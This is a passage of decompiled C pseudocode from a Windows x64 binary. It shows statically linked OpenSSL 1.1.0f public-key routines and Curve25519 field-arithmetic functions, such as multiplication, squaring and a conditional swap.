  return sub_140067440(a1, (__int64)v5, v3, 0i64);
}

//----- (0000000140067540) ----------------------------------------------------
__int64 __fastcall sub_140067540(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_140106940);
}

//----- (0000000140067560) ----------------------------------------------------
__int64 __fastcall sub_140067560(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_140106940);
}

//----- (0000000140067580) ----------------------------------------------------
__int64 __fastcall sub_140067580(int a1, __int64 a2)
{
  int *v2; // rcx

  if ( a1 == 2 )
  {
    v2 = *(int **)(*(_QWORD *)a2 + 16i64);
    if ( v2 )
      sub_140023440(*((_QWORD *)v2 + 1), *v2);
  }
  return 1i64;
}

//----- (00000001400675C0) ----------------------------------------------------
void __fastcall sub_1400675C0(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_140106AB0);
}

//----- (00000001400675E0) ----------------------------------------------------
void *sub_1400675E0()
{
  return &unk_140106AB0;
}

//----- (00000001400675F0) ----------------------------------------------------
__int64 __fastcall sub_1400675F0(_QWORD *a1, _QWORD *a2, _DWORD *a3, _QWORD *a4, __int64 a5)
{
  if ( a1 )
    *a1 = **(_QWORD **)(a5 + 8);
  if ( a2 )
  {
    *a2 = __FrameHandler3::TryBlockMap::getpDC(*(__FrameHandler3::TryBlockMap **)(a5 + 16));
    *a3 = sub_14001D4F0(*(unsigned int **)(a5 + 16));
  }
  if ( a4 )
    *a4 = *(_QWORD *)(a5 + 8);
  return 1i64;
}

//----- (0000000140067670) ----------------------------------------------------
__int64 __fastcall sub_140067670(__int64 a1, __int64 a2, int a3, int a4, __int64 a5, __int64 a6, int a7)
{
  if ( a3 >= 0 && !(unsigned int)sub_14007DA60(*(_QWORD *)a1, a3)
    || !(unsigned int)sub_140067440(*(__int64 **)(a1 + 8), a2, a4, a5) )
  {
    return 0i64;
  }
  if ( a6 )
    sub_1400476D0(*(_QWORD *)(a1 + 16), a6, a7);
  return 1i64;
}

//----- (0000000140067700) ----------------------------------------------------
__int64 __fastcall sub_140067700(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_140106AB0);
}

//----- (0000000140067720) ----------------------------------------------------
__int64 __fastcall sub_140067720(int a1, __int64 *a2)
{
  __int64 v3; // rbx

  if ( a1 == 3 )
  {
    sub_14001D3C0(*(_QWORD *)(*a2 + 16));
    return 1i64;
  }
  if ( a1 == 5 )
  {
    v3 = *a2;
    sub_14001D3C0(*(_QWORD *)(*a2 + 16));
    sub_1400248C0();
    if ( (unsigned int)sub_1400678F0((_QWORD *)(v3 + 16), (__int64 **)v3) == -1 )
      return 0i64;
    sub_1400244F0();
  }
  return 1i64;
}

//----- (00000001400677A0) ----------------------------------------------------
__int64 __fastcall sub_1400677A0(__int64 a1)
{
  __int64 result; // rax
  __int64 v2; // [rsp+40h] [rbp+8h] BYREF

  v2 = 0i64;
  if ( a1 && *(_QWORD *)(a1 + 8) )
  {
    result = *(_QWORD *)(a1 + 16);
    if ( result )
      return result;
    sub_1400678F0(&v2, (__int64 **)a1);
    if ( v2 )
    {
      sub_140024610(11, 119, 68, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x_pubkey.c", 161);
      sub_14001D3C0(v2);
    }
  }
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140067820) ----------------------------------------------------
__int64 __fastcall sub_140067820(_QWORD *a1, _QWORD *a2, _DWORD *a3, _QWORD *a4, __int64 a5)
{
  if ( a1 )
    *a1 = **(_QWORD **)a5;
  if ( a2 )
  {
    *a2 = *(_QWORD *)(*(_QWORD *)(a5 + 8) + 8i64);
    *a3 = **(_DWORD **)(a5 + 8);
  }
  if ( a4 )
    *a4 = *(_QWORD *)a5;
  return 1i64;
}

//----- (0000000140067860) ----------------------------------------------------
void *sub_140067860()
{
  return &unk_140106B90;
}

//----- (0000000140067870) ----------------------------------------------------
__int64 __fastcall sub_140067870(__int64 a1, __int64 a2, int a3, __int64 a4, __int64 a5, int a6)
{
  __int64 result; // rax

  result = sub_140067440(*(__int64 **)a1, a2, a3, a4);
  if ( (_DWORD)result )
  {
    if ( a5 )
    {
      sub_14001D930(*(void **)(*(_QWORD *)(a1 + 8) + 8i64));
      *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8i64) = a5;
      **(_DWORD **)(a1 + 8) = a6;
      *(_DWORD *)(*(_QWORD *)(a1 + 8) + 16i64) &= 0xFFFFFFF0;
      *(_DWORD *)(*(_QWORD *)(a1 + 8) + 16i64) |= 8u;
    }
    return 1i64;
  }
  return result;
}

//----- (00000001400678F0) ----------------------------------------------------
__int64 __fastcall sub_1400678F0(_QWORD *a1, __int64 **a2)
{
  _DWORD *v4; // rbx
  int v6; // eax
  unsigned int (__fastcall *v7)(_DWORD *, __int64 **); // r8

  v4 = sub_14001D530();
  if ( !v4 )
  {
    sub_140024610(11, 148, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x_pubkey.c", 108);
    return 0xFFFFFFFFi64;
  }
  v6 = sub_14002C260(**a2);
  if ( (unsigned int)sub_14001D6E0((__int64)v4, v6) )
  {
    v7 = *(unsigned int (__fastcall **)(_DWORD *, __int64 **))(*((_QWORD *)v4 + 2) + 32i64);
    if ( v7 )
    {
      if ( v7(v4, a2) )
      {
        *a1 = v4;
        return 1i64;
      }
      sub_140024610(11, 148, 125, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x_pubkey.c", 124);
    }
    else
    {
      sub_140024610(11, 148, 124, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x_pubkey.c", 128);
    }
  }
  else
  {
    sub_140024610(11, 148, 111, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x_pubkey.c", 113);
  }
  sub_14001D3C0((__int64)v4);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140067A00) ----------------------------------------------------
_BOOL8 __fastcall sub_140067A00(_BYTE *a1, __m128i *a2, unsigned __int8 *a3)
{
  sub_14006A810(a1, a2, a3);
  return (unsigned int)sub_140023460(byte_14010E420, (__int64)a1, 32i64) != 0;
}

//----- (0000000140067A40) ----------------------------------------------------
__int64 __fastcall sub_140067A40(_BYTE *a1, __m128i *a2)
{
  __m128i v2; // xmm2
  int v5[12]; // [rsp+20h] [rbp-E0h] BYREF
  char v6[40]; // [rsp+50h] [rbp-B0h] BYREF
  int v7; // [rsp+78h] [rbp-88h]
  int v8; // [rsp+7Ch] [rbp-84h]
  int v9; // [rsp+80h] [rbp-80h]
  int v10; // [rsp+84h] [rbp-7Ch]
  int v11; // [rsp+88h] [rbp-78h]
  int v12; // [rsp+8Ch] [rbp-74h]
  int v13; // [rsp+90h] [rbp-70h]
  int v14; // [rsp+94h] [rbp-6Ch]
  int v15; // [rsp+98h] [rbp-68h]
  int v16; // [rsp+9Ch] [rbp-64h]
  int v17; // [rsp+A0h] [rbp-60h]
  int v18; // [rsp+A4h] [rbp-5Ch]
  int v19; // [rsp+A8h] [rbp-58h]
  int v20; // [rsp+ACh] [rbp-54h]
  int v21; // [rsp+B0h] [rbp-50h]
  int v22; // [rsp+B4h] [rbp-4Ch]
  int v23; // [rsp+B8h] [rbp-48h]
  int v24; // [rsp+BCh] [rbp-44h]
  int v25; // [rsp+C0h] [rbp-40h]
  int v26; // [rsp+C4h] [rbp-3Ch]
  __m128i v27; // [rsp+F0h] [rbp-10h] BYREF
  __m128i v28; // [rsp+100h] [rbp+0h]
  int v29; // [rsp+110h] [rbp+10h]
  int v30; // [rsp+114h] [rbp+14h]
  int v31[10]; // [rsp+118h] [rbp+18h] BYREF

  v2 = *a2;
  v28 = a2[1];
  v27 = v2;
  v27.m128i_i8[0] = _mm_cvtsi128_si32(v2) & 0xF8;
  v28.m128i_i8[15] = HIBYTE(_mm_srli_si128(v28, 8).m128i_u64[0]) & 0x3F | 0x40;
  sub_14006A1E0((__int64)v6, (__int64)&v27);
  v31[0] = v17 - v7;
  v27.m128i_i32[0] = v7 + v17;
  v31[1] = v18 - v8;
  v27.m128i_i32[1] = v8 + v18;
  v31[2] = v19 - v9;
  v27.m128i_i32[2] = v9 + v19;
  v31[3] = v20 - v10;
  v27.m128i_i32[3] = v10 + v20;
  v31[4] = v21 - v11;
  v28.m128i_i32[0] = v11 + v21;
  v31[5] = v22 - v12;
  v28.m128i_i32[1] = v12 + v22;
  v31[6] = v23 - v13;
  v28.m128i_i32[2] = v13 + v23;
  v31[7] = v24 - v14;
  v28.m128i_i32[3] = v14 + v24;
  v31[8] = v25 - v15;
  v29 = v15 + v25;
  v31[9] = v26 - v16;
  v30 = v16 + v26;
  sub_140068020(v5, v31);
  sub_1400682A0(&v27, v27.m128i_i32, v5);
  return sub_1400698D0(a1, v27.m128i_i32);
}
// 140067A40: using guessed type char var_100[40];
// 140067A40: using guessed type int var_130[12];

//----- (0000000140067BA0) ----------------------------------------------------
void __fastcall sub_140067BA0(_DWORD *a1, _DWORD *a2, unsigned __int8 a3)
{
  int v3; // r9d

  v3 = -a3;
  *a1 ^= v3 & (*a2 ^ *a1);
  a1[1] ^= v3 & (a1[1] ^ a2[1]);
  a1[2] ^= v3 & (a1[2] ^ a2[2]);
  a1[3] ^= v3 & (a1[3] ^ a2[3]);
  a1[4] ^= v3 & (a1[4] ^ a2[4]);
  a1[5] ^= v3 & (a1[5] ^ a2[5]);
  a1[6] ^= v3 & (a1[6] ^ a2[6]);
  a1[7] ^= v3 & (a1[7] ^ a2[7]);
  a1[8] ^= v3 & (a1[8] ^ a2[8]);
  a1[9] ^= v3 & (a1[9] ^ a2[9]);
  a1[10] ^= v3 & (a1[10] ^ a2[10]);
  a1[11] ^= v3 & (a1[11] ^ a2[11]);
  a1[12] ^= v3 & (a1[12] ^ a2[12]);
  a1[13] ^= v3 & (a1[13] ^ a2[13]);
  a1[14] ^= v3 & (a1[14] ^ a2[14]);
  a1[15] ^= v3 & (a1[15] ^ a2[15]);
  a1[16] ^= v3 & (a1[16] ^ a2[16]);
  a1[17] ^= v3 & (a1[17] ^ a2[17]);
  a1[18] ^= v3 & (a1[18] ^ a2[18]);
  a1[19] ^= v3 & (a1[19] ^ a2[19]);
  a1[20] ^= v3 & (a1[20] ^ a2[20]);
  a1[21] ^= v3 & (a1[21] ^ a2[21]);
  a1[22] ^= v3 & (a1[22] ^ a2[22]);
  a1[23] ^= v3 & (a1[23] ^ a2[23]);
  a1[24] ^= v3 & (a1[24] ^ a2[24]);
  a1[25] ^= v3 & (a1[25] ^ a2[25]);
  a1[26] ^= v3 & (a1[26] ^ a2[26]);
  a1[27] ^= v3 & (a1[27] ^ a2[27]);
  a1[28] ^= v3 & (a1[28] ^ a2[28]);
  a1[29] ^= v3 & (a1[29] ^ a2[29]);
}

//----- (0000000140067D50) ----------------------------------------------------
__int64 __fastcall sub_140067D50(_DWORD *a1, unsigned __int8 *a2)
{
  unsigned __int64 v2; // r8
  unsigned __int64 v3; // r12
  unsigned __int64 v4; // r13
  unsigned __int64 v5; // r11
  unsigned __int64 v6; // r15
  unsigned __int64 v7; // rbp
  __int64 result; // rax
  unsigned __int64 v9; // [rsp+0h] [rbp-58h]
  unsigned __int64 v10; // [rsp+8h] [rbp-50h]
  unsigned __int64 v11; // [rsp+68h] [rbp+10h]
  int v12; // [rsp+70h] [rbp+18h]
  unsigned __int64 v13; // [rsp+78h] [rbp+20h]

  v11 = (a2[4] | ((unsigned __int64)*(unsigned __int16 *)(a2 + 5) << 8)) << 6;
  v2 = 8 * (a2[10] | ((unsigned __int64)*(unsigned __int16 *)(a2 + 11) << 8));
  v12 = 8 * (a2[10] | (*(unsigned __int16 *)(a2 + 11) << 8));
  v13 = a2[16] | ((a2[17] | ((a2[18] | ((unsigned __int64)a2[19] << 8)) << 8)) << 8);
  v9 = 32 * (a2[23] | ((unsigned __int64)*((unsigned __int16 *)a2 + 12) << 8));
  v10 = 4 * (((unsigned __int64)a2[30] << 8) | (a2[29] | (a2[31] << 16)) & 0x7FFFFF);
  v3 = 19 * ((__int64)(v10 + 0x1000000) >> 25)
     + (*a2 | ((a2[1] | ((a2[2] | ((unsigned __int64)a2[3] << 8)) << 8)) << 8));
  v4 = ((__int64)(v11 + 0x1000000) >> 25) + 32 * (a2[7] | ((a2[8] | ((unsigned __int64)a2[9] << 8)) << 8));
  v5 = ((__int64)(v2 + 0x1000000) >> 25) + 4 * (a2[13] | ((unsigned __int64)*((unsigned __int16 *)a2 + 7) << 8));
  v6 = ((__int64)(v13 + 0x1000000) >> 25) + ((a2[20] | ((unsigned __int64)*(unsigned __int16 *)(a2 + 21) << 8)) << 7);
  v7 = ((__int64)(v9 + 0x1000000) >> 25) + 16 * (a2[26] | ((unsigned __int64)*(unsigned __int16 *)(a2 + 27) << 8));
  a1[1] = v11 + ((__int64)(v3 + 0x2000000) >> 26) - ((v11 + 0x1000000) & 0xFE000000);
  *a1 = v3 - ((v3 + 0x2000000) & 0xFC000000);
  a1[2] = v4 - ((v4 + 0x2000000) & 0xFC000000);
  a1[3] = v12 + ((__int64)(v4 + 0x2000000) >> 26) - ((v2 + 0x1000000) & 0xFE000000);
  a1[4] = v5 - ((v5 + 0x2000000) & 0xFC000000);
  a1[6] = v6 - ((v6 + 0x2000000) & 0xFC000000);
  a1[5] = v13 + ((__int64)(v5 + 0x2000000) >> 26) - ((v13 + 0x1000000) & 0xFE000000);
  result = ((_DWORD)v10 + 0x1000000) & 0xFE000000;
  a1[7] = v9 + ((__int64)(v6 + 0x2000000) >> 26) - ((v9 + 0x1000000) & 0xFE000000);
  a1[8] = v7 - ((v7 + 0x2000000) & 0xFC000000);
  a1[9] = v10 + ((__int64)(v7 + 0x2000000) >> 26) - result;
  return result;
}

//----- (0000000140068020) ----------------------------------------------------
__int64 __fastcall sub_140068020(_DWORD *a1, int *a2)
{
  __int64 v4; // rsi
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rbx
  __int64 v8; // rbx
  __int64 v9; // rbx
  __int64 v10; // rdi
  __int64 v11; // rdi
  int v13[10]; // [rsp+20h] [rbp-49h] BYREF
  int v14[10]; // [rsp+48h] [rbp-21h] BYREF
  int v15[10]; // [rsp+70h] [rbp+7h] BYREF
  int v16[10]; // [rsp+98h] [rbp+2Fh] BYREF

  sub_140068DC0(v16, a2);
  sub_140068DC0(v14, v16);
  sub_140068DC0(v14, v14);
  sub_1400682A0(v14, a2, v14);
  sub_1400682A0(v16, v16, v14);
  sub_140068DC0(v13, v16);
  sub_1400682A0(v14, v14, v13);
  sub_140068DC0(v13, v14);
  v4 = 4i64;
  v5 = 4i64;
  do
  {
    sub_140068DC0(v13, v13);
    --v5;
  }
  while ( v5 );
  sub_1400682A0(v14, v13, v14);
  sub_140068DC0(v13, v14);
  v6 = 9i64;
  do
  {
    sub_140068DC0(v13, v13);
    --v6;
  }
  while ( v6 );
  sub_1400682A0(v13, v13, v14);
  sub_140068DC0(v15, v13);
  v7 = 19i64;
  do
  {
    sub_140068DC0(v15, v15);
    --v7;
  }
  while ( v7 );
  sub_1400682A0(v13, v15, v13);
  v8 = 10i64;
  do
  {
    sub_140068DC0(v13, v13);
    --v8;
  }
  while ( v8 );
  sub_1400682A0(v14, v13, v14);
  sub_140068DC0(v13, v14);
  v9 = 49i64;
  v10 = 49i64;
  do
  {
    sub_140068DC0(v13, v13);
    --v10;
  }
  while ( v10 );
  sub_1400682A0(v13, v13, v14);
  sub_140068DC0(v15, v13);
  v11 = 99i64;
  do
  {
    sub_140068DC0(v15, v15);
    --v11;
  }
  while ( v11 );
  sub_1400682A0(v13, v15, v13);
  sub_140068DC0(v13, v13);
  do
  {
    sub_140068DC0(v13, v13);
    --v9;
  }
  while ( v9 );
  sub_1400682A0(v14, v13, v14);
  sub_140068DC0(v14, v14);
  do
  {
    sub_140068DC0(v14, v14);
    --v4;
  }
  while ( v4 );
  return sub_1400682A0(a1, v14, v16);
}
// 140068020: using guessed type int var_28[10];
// 140068020: using guessed type int var_78[10];
// 140068020: using guessed type int var_A0[10];
// 140068020: using guessed type int var_50[10];

//----- (00000001400682A0) ----------------------------------------------------
__int64 __fastcall sub_1400682A0(_DWORD *a1, int *a2, int *a3)
{
  __int64 v3; // rdi
  __int64 v4; // r12
  __int64 v5; // r15
  __int64 v6; // r14
  __int64 v7; // rsi
  __int64 v8; // rbp
  __int64 v9; // r10
  __int64 v10; // r11
  __int64 v11; // r13
  __int64 v12; // rcx
  __int64 v13; // rbx
  __int64 v14; // r10
  __int64 v15; // r12
  __int64 v16; // rsi
  __int64 v17; // rdi
  __int64 v18; // r14
  __int64 v19; // r13
  __int64 v20; // rbp
  __int64 v21; // rdi
  __int64 v22; // r10
  unsigned __int64 v23; // r14
  __int64 result; // rax
  __int64 v25; // [rsp+0h] [rbp-138h]
  __int64 v26; // [rsp+0h] [rbp-138h]
  __int64 v27; // [rsp+8h] [rbp-130h]
  __int64 v28; // [rsp+10h] [rbp-128h]
  __int64 v29; // [rsp+18h] [rbp-120h]
  __int64 v30; // [rsp+20h] [rbp-118h]
  __int64 v31; // [rsp+28h] [rbp-110h]
  __int64 v32; // [rsp+30h] [rbp-108h]
  __int64 v33; // [rsp+40h] [rbp-F8h]
  __int64 v34; // [rsp+48h] [rbp-F0h]
  __int64 v35; // [rsp+50h] [rbp-E8h]
  __int64 v36; // [rsp+58h] [rbp-E0h]
  __int64 v37; // [rsp+60h] [rbp-D8h]
  __int64 v38; // [rsp+68h] [rbp-D0h]
  unsigned __int64 v39; // [rsp+68h] [rbp-D0h]
  __int64 v40; // [rsp+70h] [rbp-C8h]
  __int64 v41; // [rsp+78h] [rbp-C0h]
  __int64 v42; // [rsp+78h] [rbp-C0h]
  __int64 v43; // [rsp+80h] [rbp-B8h]
  __int64 v44; // [rsp+88h] [rbp-B0h]
  __int64 v45; // [rsp+90h] [rbp-A8h]
  __int64 v46; // [rsp+98h] [rbp-A0h]
  __int64 v47; // [rsp+A0h] [rbp-98h]
  __int64 v48; // [rsp+A8h] [rbp-90h]
  __int64 v49; // [rsp+B0h] [rbp-88h]
  __int64 v50; // [rsp+B8h] [rbp-80h]
  __int64 v51; // [rsp+C0h] [rbp-78h]
  __int64 v52; // [rsp+C8h] [rbp-70h]
  __int64 v53; // [rsp+D8h] [rbp-60h]
  __int64 v54; // [rsp+E0h] [rbp-58h]
  __int64 v55; // [rsp+E8h] [rbp-50h]
  int v57; // [rsp+148h] [rbp+10h]
  int v58; // [rsp+150h] [rbp+18h]
  int v59; // [rsp+158h] [rbp+20h]

  v3 = a2[9];
  v4 = a2[1];
  v5 = a2[3];
  v6 = a2[5];
  v7 = a2[7];
  v58 = a3[8];
  v37 = 2 * (int)v3;
  v34 = 2 * (int)v4;
  v8 = a3[5];
  v9 = a3[4];
  v10 = a3[1];
  v59 = a3[9];
  v57 = a3[7];
  v31 = 19 * v59;
  v45 = 2 * (int)v5;
  v41 = 19 * v57;
  v36 = 2 * (int)v6;
  v35 = 2 * (int)v7;
  v11 = 19 * a3[3];
  v12 = 19 * a3[2];
  v30 = a2[8];
  v29 = a2[6];
  v51 = 19 * a3[6];
  v28 = a2[4];
  v44 = 19 * v58;
  v27 = a2[2];
  v50 = *a3;
  v32 = *a2;
  v48 = a3[2];
  v33 = a3[3];
  v13 = v32 * v9;
  v52 = v4;
  v46 = v9;
  v25 = v35 * v11 + v12 * v30 + 19 * (int)v9 * v29 + v51 * v28 + v44 * v27 + v50 * v32 + v37 * 19 * (int)v10;
  v14 = 19 * (int)v9;
  v49 = v3;
  v26 = v34 * v31 + v45 * v41 + v36 * 19 * (int)v8 + v25;
  v47 = v7;
  v53 = v6;
  v38 = v37 * 19 * (int)v8
      + v31 * v36
      + v41 * v35
      + v34 * v33
      + v45 * v10
      + v30 * v51
      + v29 * v44
      + v28 * v50
      + v27 * v48
      + v13;
  v15 = v11 * v30 + v12 * v3 + v14 * v7 + v51 * v6 + v32 * v10 + v44 * v5 + v50 * v4;
  v16 = v41;
  v17 = 19 * (int)v8;
  v43 = v8;
  v42 = ((v26 + 0x2000000) >> 26) + v31 * v27 + v41 * v28 + v17 * v29 + v15;
  v54 = ((v38 + 0x2000000) >> 26)
      + v31 * v29
      + v16 * v30
      + v28 * v10
      + v51 * v49
      + v27 * v33
      + v44 * v47
      + v50 * v6
      + v32 * v8
      + v48 * v5
      + v46 * a2[1];
  v18 = a3[6];
  v40 = ((v42 + 0x1000000) >> 25)
      + v31 * v45
      + v37 * v11
      + v16 * v36
      + v17 * v35
      + v34 * v10
      + v30 * v14
      + v29 * v51
      + v28 * v44
      + v27 * v50
      + v32 * v48;
  v55 = ((v54 + 0x1000000) >> 25)
      + v37 * v16
      + v31 * v35
      + v45 * v33
      + v36 * v10
      + v30 * v44
      + v34 * v8
      + v29 * v50
      + v28 * v48
      + v27 * v46
      + v32 * v18;
  v19 = ((v40 + 0x2000000) >> 26)
      + v31 * v28
      + v16 * v29
      + v17 * v30
      + v14 * v49
      + v51 * v47
      + v27 * v10
      + v32 * v33
      + v44 * v53
      + v50 * v5
      + v48 * v52;
  v20 = ((v55 + 0x2000000) >> 26)
      + v31 * v30
      + v29 * v10
      + v28 * v33
      + v44 * v49
      + v50 * v47
      + v27 * v8
      + v48 * v53
      + v46 * v5
      + v52 * v18
      + v57 * v32;
  v39 = ((v19 + 0x1000000) >> 25) - ((v38 + 0x2000000) & 0xFFFFFFFFFC000000ui64) + v38;
  v21 = ((v20 + 0x1000000) >> 25)
      + v37 * v31
      + v36 * v33
      + v35 * v10
      + v30 * v50
      + v45 * v43
      + v29 * v48
      + v28 * v46
      + v27 * v18
      + v57 * v34
      + v58 * v32;
  v22 = ((v21 + 0x2000000) >> 26)
      + v30 * v10
      + v29 * v33
      + v50 * v49
      + v28 * v43
      + v48 * v47
      + v46 * v53
      + v5 * v18
      + v57 * v27
      + v58 * v52
      + v32 * v59;
  v23 = 19 * ((v22 + 0x1000000) >> 25) - ((v26 + 0x2000000) & 0xFFFFFFFFFC000000ui64) + v26;
  *a1 = v23 - ((v23 + 0x2000000) & 0xFC000000);
  a1[2] = v40 - ((v40 + 0x2000000) & 0xFC000000);
  a1[1] = v42 + ((__int64)(v23 + 0x2000000) >> 26) - ((v42 + 0x1000000) & 0xFE000000);
  a1[3] = v19 - ((v19 + 0x1000000) & 0xFE000000);
  result = (unsigned int)v55 - (((_DWORD)v55 + 0x2000000) & 0xFC000000);
  a1[4] = v39 - ((v39 + 0x2000000) & 0xFC000000);
  a1[5] = v54 + ((__int64)(v39 + 0x2000000) >> 26) - ((v54 + 0x1000000) & 0xFE000000);
  a1[9] = v22 - ((v22 + 0x1000000) & 0xFE000000);
  a1[6] = result;
  a1[7] = v20 - ((v20 + 0x1000000) & 0xFE000000);
  a1[8] = v21 - ((v21 + 0x2000000) & 0xFC000000);
  return result;
}

//----- (0000000140068BC0) ----------------------------------------------------
__int64 __fastcall sub_140068BC0(_DWORD *a1, int *a2)
{
  __int64 v2; // r14
  __int64 v3; // rbp
  __int64 v4; // r8
  __int64 v5; // r11
  __int64 v6; // rax
  __int64 v7; // rdi
  __int64 v8; // r15
  __int64 v9; // r13
  __int64 result; // rax
  __int64 v11; // [rsp+8h] [rbp-50h]
  int v12; // [rsp+68h] [rbp+10h]
  __int64 v13; // [rsp+70h] [rbp+18h]
  int v14; // [rsp+78h] [rbp+20h]

  v2 = 121666i64 * a2[1];
  v3 = 121666i64 * a2[7];
  v12 = 121666 * a2[3];
  v11 = 121666i64 * a2[9];
  v13 = 121666i64 * a2[5];
  v14 = 121666 * a2[7];
  v4 = 19 * ((v11 + 0x1000000) >> 25) + 121666i64 * *a2;
  v5 = ((v2 + 0x1000000) >> 25) + 121666i64 * a2[2];
  v6 = 121666i64 * a2[3] + 0x1000000;
  v7 = (v6 >> 25) + 121666i64 * a2[4];
  v8 = ((v13 + 0x1000000) >> 25) + 121666i64 * a2[6];
  v9 = ((v3 + 0x1000000) >> 25) + 121666i64 * a2[8];
  *a1 = v4 - ((v4 + 0x2000000) & 0xFC000000);
  a1[1] = v2 + ((v4 + 0x2000000) >> 26) - ((v2 + 0x1000000) & 0xFE000000);
  a1[2] = v5 - ((v5 + 0x2000000) & 0xFC000000);
  a1[3] = v12 + ((v5 + 0x2000000) >> 26) - (v6 & 0xFE000000);
  a1[5] = v13 + ((v7 + 0x2000000) >> 26) - ((v13 + 0x1000000) & 0xFE000000);
  a1[4] = v7 - ((v7 + 0x2000000) & 0xFC000000);
  a1[6] = v8 - ((v8 + 0x2000000) & 0xFC000000);
  a1[8] = v9 - ((v9 + 0x2000000) & 0xFC000000);
  result = ((_DWORD)v11 + 0x1000000) & 0xFE000000;
  a1[7] = v14 + ((v8 + 0x2000000) >> 26) - ((v3 + 0x1000000) & 0xFE000000);
  a1[9] = v11 + ((v9 + 0x2000000) >> 26) - result;
  return result;
}

//----- (0000000140068DC0) ----------------------------------------------------
__int64 __fastcall sub_140068DC0(_DWORD *a1, int *a2)
{
  __int64 v2; // r10
  __int64 v3; // r11
  __int64 v4; // rsi
  __int64 v5; // rbx
  __int64 v6; // r14
  __int64 v7; // rbp
  __int64 v8; // rdx
  __int64 v9; // r13
  __int64 v10; // r9
  __int64 v11; // r11
  __int64 v12; // r14
  __int64 v13; // rbx
  __int64 v14; // rdi
  unsigned __int64 v15; // r15
  __int64 result; // rax
  __int64 v17; // [rsp+0h] [rbp-C8h]
  __int64 v18; // [rsp+8h] [rbp-C0h]
  __int64 v19; // [rsp+10h] [rbp-B8h]
  __int64 v20; // [rsp+18h] [rbp-B0h]
  __int64 v21; // [rsp+20h] [rbp-A8h]
  __int64 v22; // [rsp+28h] [rbp-A0h]
  __int64 v23; // [rsp+30h] [rbp-98h]
  __int64 v24; // [rsp+38h] [rbp-90h]
  __int64 v25; // [rsp+40h] [rbp-88h]
  __int64 v26; // [rsp+48h] [rbp-80h]
  __int64 v27; // [rsp+50h] [rbp-78h]
  __int64 v28; // [rsp+58h] [rbp-70h]
  __int64 v29; // [rsp+60h] [rbp-68h]
  __int64 v30; // [rsp+68h] [rbp-60h]
  __int64 v31; // [rsp+70h] [rbp-58h]
  int v32; // [rsp+D8h] [rbp+10h]
  __int64 v33; // [rsp+E0h] [rbp+18h]
  unsigned __int64 v34; // [rsp+E0h] [rbp+18h]
  __int64 v35; // [rsp+E8h] [rbp+20h]

  v2 = *a2;
  v3 = a2[2];
  v4 = a2[6];
  v5 = a2[1];
  v6 = a2[3];
  v7 = a2[8];
  v32 = a2[9];
  v25 = a2[5];
  v26 = a2[4];
  v28 = a2[7];
  v8 = 19 * (int)v4;
  v24 = 2 * (int)v26;
  v18 = 2 * (int)v6;
  v19 = 2 * (int)v3;
  v35 = 2 * (int)v5;
  v21 = 38 * v32;
  v9 = 38 * (int)v28;
  v10 = v3;
  v17 = v8 * v24 + v9 * v18 + 19 * (int)v7 * v19 + v21 * v35 + v2 * v2 + v25 * 38 * (int)v25;
  v11 = 19 * (int)v7;
  v27 = 2 * (int)v25;
  v23 = 2 * (int)v2;
  v33 = v18 * v35 + v9 * v28 + v21 * v27 + v23 * v26 + v10 * v10 + v11 * 2 * (int)v4;
  v22 = ((v17 + 0x2000000) >> 26) + v18 * v11 + v8 * v27 + v9 * v26 + v21 * v10 + v23 * v5;
  v29 = ((v33 + 0x2000000) >> 26) + v25 * v23 + v35 * v26 + v11 * 2 * (int)v28 + v19 * v6 + v21 * v4;
  v30 = ((v22 + 0x1000000) >> 25) + v24 * v11 + v18 * v21 + v9 * v27 + v8 * v4 + v35 * v5 + v23 * v10;
  v31 = ((v29 + 0x1000000) >> 25) + v19 * v26 + v35 * v27 + v18 * v6 + v21 * 2 * (int)v28 + v11 * v7 + v23 * v4;
  v20 = ((v30 + 0x2000000) >> 26) + v11 * v27 + v9 * v4 + v21 * v26 + v35 * v10 + v23 * v6;
  v12 = ((v31 + 0x2000000) >> 26) + v25 * v19 + v18 * v26 + v35 * v4 + v28 * v23 + v21 * v7;
  v34 = ((v20 + 0x1000000) >> 25) - ((v33 + 0x2000000) & 0xFFFFFFFFFC000000ui64) + v33;
  v13 = ((v12 + 0x1000000) >> 25) + v18 * v27 + v19 * v4 + v35 * 2 * (int)v28 + v26 * v26 + v21 * v32 + v23 * v7;
  a1[7] = v12 - ((v12 + 0x1000000) & 0xFE000000);
  v14 = ((v13 + 0x2000000) >> 26) + v25 * v24 + v19 * v28 + v18 * v4 + v35 * v7 + v23 * v32;
  a1[8] = v13 - ((v13 + 0x2000000) & 0xFC000000);
  v15 = 19 * ((v14 + 0x1000000) >> 25) - ((v17 + 0x2000000) & 0xFFFFFFFFFC000000ui64) + v17;
  *a1 = v15 - ((v15 + 0x2000000) & 0xFC000000);
  a1[2] = v30 - ((v30 + 0x2000000) & 0xFC000000);
  a1[1] = v22 + ((__int64)(v15 + 0x2000000) >> 26) - ((v22 + 0x1000000) & 0xFE000000);
  a1[3] = v20 - ((v20 + 0x1000000) & 0xFE000000);
  result = (unsigned int)v31 - (((_DWORD)v31 + 0x2000000) & 0xFC000000);
  a1[4] = v34 - ((v34 + 0x2000000) & 0xFC000000);
  a1[5] = v29 + ((__int64)(v34 + 0x2000000) >> 26) - ((v29 + 0x1000000) & 0xFE000000);
  a1[9] = v14 - ((v14 + 0x1000000) & 0xFE000000);
  a1[6] = result;
  return result;
}

//----- (0000000140069360) ----------------------------------------------------
__int64 __fastcall sub_140069360(_DWORD *a1, int *a2)
{
  __int64 v2; // r11
  __int64 v3; // rsi
  __int64 v4; // r10
